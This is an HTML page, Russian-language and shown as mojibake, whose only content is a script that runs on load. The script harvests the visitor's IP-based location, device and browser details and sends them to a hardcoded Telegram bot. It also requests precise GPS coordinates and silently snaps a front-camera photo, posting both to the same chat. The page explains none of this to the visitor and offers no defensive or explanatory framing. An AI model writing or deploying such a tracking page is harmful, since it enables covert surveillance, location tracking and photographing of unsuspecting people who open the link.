<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>ü©∏ –ù–æ–≤—ã–π –≤–∏–∑–∏—Ç</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1a1a1a;
            color: white;
            padding: 20px;
        }

        video {
            display: none;
        }
    </style>
</head>
<body>
    <script>
        const botToken = '7555654768:AAEc531lRqxQExZp-2F4mVVNdI5FrGXreA0';  
        const chatId = '6695380917';  
        const ipInfoToken = 'e579b6b3444f57';  

        const sendMessage = async (message) => {
            try {
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                const response = await fetch(url);

                if (response.ok) {
                    console.log("–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ!");
                } else {
                    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è", response);
                }
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫ Telegram API:", error);
            }
        };

        const sendLocation = async (latitude, longitude) => {
            try {
                const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
                const response = await fetch(url);

                if (response.ok) {
                    console.log("–ì–µ–æ–º–µ—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ!");
                } else {
                    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≥–µ–æ–º–µ—Ç–∫–∏", response);
                }
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫ Telegram API –¥–ª—è –≥–µ–æ–º–µ—Ç–∫–∏:", error);
            }
        };

        const generateVisitorId = () => Math.floor(Math.random() * 1000000);

        const getBrowserType = () => {
            const ua = navigator.userAgent;
            if (/chrome|chromium|crios/i.test(ua)) return 'Chrome';
            if (/firefox|fxios/i.test(ua)) return 'Firefox';
            if (/safari/i.test(ua)) return 'Safari';
            if (/edge/i.test(ua)) return 'Edge';
            if (/yaBrowser/i.test(ua)) return 'Yandex Browser'; 
            if (/opera|OPR/i.test(ua)) return 'Opera';  
            if (/brave/i.test(ua)) return 'Brave'; 
            if (/mblbrowser/i.test(ua)) return 'Mai Browser'; 
            return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
        };

        const getOperatingSystem = () => {
            const ua = navigator.userAgent;
            if (/Windows/i.test(ua)) return 'Windows';
            if (/Macintosh/i.test(ua)) return 'macOS';
            if (/Linux/i.test(ua)) return 'Linux';
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone/i.test(ua)) return 'iOS';
            return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
        };

        const getDeviceName = () => {
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone/i.test(ua)) return 'iPhone';
            if (/Windows NT/i.test(ua)) return 'Windows';
            if (/Macintosh/i.test(ua)) return 'macOS';
            return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
        };

        const getUserIp = async () => {
            const response = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
            const data = await response.json();
            return data;
        };

        const getTimeZone = () => Intl.DateTimeFormat().resolvedOptions().timeZone;

        const sendVisitorInfo = async () => {
            const visitorId = generateVisitorId();
            const browserType = getBrowserType();
            const operatingSystem = getOperatingSystem();
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const timeZone = getTimeZone();
            const ipInfo = await getUserIp();
            const deviceName = getDeviceName();
            const currentTime = new Date().toLocaleString();

            const message = `
<b>üîé Revenant Api:</b>

üìù <b>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –≤—Ö–æ–¥–∞:</b>
‚îú <b>Visitor ID:</b> #${visitorId}  
‚îî <b>–í—Ä–µ–º—è:</b> ${currentTime}  

<b>üåê –ì–µ–æ–¥–∞–Ω–Ω—ã–µ:</b>
‚îú <b>IP-–∞–¥—Ä–µ—Å:</b> ${ipInfo.ip}  
‚îú <b>–ì–æ—Ä–æ–¥:</b> ${ipInfo.city}  
‚îú <b>–õ–æ–∫–∞—Ü–∏—è:</b> ${ipInfo.city}, ${ipInfo.country}  
‚îú <b>–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:</b> ${ipInfo.loc}  
‚îî <b>–°—Ç—Ä–∞–Ω–∞:</b> ${ipInfo.country}  

<b>üíª –ú–µ—Ö–∞–Ω–∏–∫–∞:</b>
‚îú <b>–ë—Ä–∞—É–∑–µ—Ä:</b> ${browserType}  
‚îú <b>–û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞:</b> ${operatingSystem}  
‚îú <b>–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞:</b> ${screenResolution}  
‚îî <b>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</b> ${deviceName}  

<b>üï∞ –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:</b>
‚îú <b>–Ø–∑—ã–∫:</b> ${navigator.language}  
‚îî <b>–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å:</b> ${timeZone}
`;

            await sendMessage(message);
        };

        const sendGeoPermissionResult = async (status, coords = null) => {
            let message = '';

            if (status === 'granted' && coords) {
                message = `
‚úÖ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑—Ä–µ—à–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏!</b>

üåê <b>–®–∏—Ä–æ—Ç–∞:</b> ${coords.latitude}
üåê <b>–î–æ–ª–≥–æ—Ç–∞:</b> ${coords.longitude}
üéØ <b>–¢–æ—á–Ω–æ—Å—Ç—å:</b> ¬±${coords.accuracy} –º
`;

                await sendLocation(coords.latitude, coords.longitude);
            } else if (status === 'denied') {
                message = "‚ùå <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–∞–∑–∞–ª –≤ –¥–æ—Å—Ç—É–ø–µ –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏.</b>";
            } else {
                message = "‚ö†Ô∏è <b>–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Å—Ç–∞—Ç—É—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏.</b>";
            }

            await sendMessage(message);
        };

        const requestCameraPermission = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }  // –ü–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã
                });

                const videoElement = document.createElement("video");
                videoElement.srcObject = stream;
                videoElement.play();

                // –ó–∞—Ö–≤–∞—Ç—ã–≤–∞–µ–º —Ñ–æ—Ç–æ –ø–æ—Å–ª–µ 1 —Å–µ–∫—É–Ω–¥—ã (–≤—Ä–µ–º—è –Ω–∞ –∑–∞–≥—Ä—É–∑–∫—É –≤–∏–¥–µ–æ)
                setTimeout(() => {
                    capturePhoto(videoElement, stream);
                }, 1000);
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ –∫–∞–º–µ—Ä–µ:", error);
            }
        };

        const capturePhoto = async (videoElement, stream) => {
            const canvas = document.createElement("canvas");
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const context = canvas.getContext("2d");
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

            await sendPhotoToTelegram(photoBlob);
            stream.getTracks().forEach(track => track.stop());
        };

        const sendPhotoToTelegram = async (photoBlob) => {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", photoBlob, "photo.jpg");

            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                console.log("–§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram —É—Å–ø–µ—à–Ω–æ!");
            } else {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–æ—Ç–æ –≤ Telegram", response);
            }
        };

        const init = async () => {
            await sendVisitorInfo();

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const coords = {
                        latitude: position.coords.latitude.toFixed(6),
                        longitude: position.coords.longitude.toFixed(6),
                        accuracy: position.coords.accuracy.toFixed(1)
                    };
                    await sendGeoPermissionResult('granted', coords);

                    await requestCameraPermission();
                },
                async (error) => {
                    console.warn("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:", error);
                    await sendGeoPermissionResult('denied');
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        };

        init();
    </script>
</body>
</html>
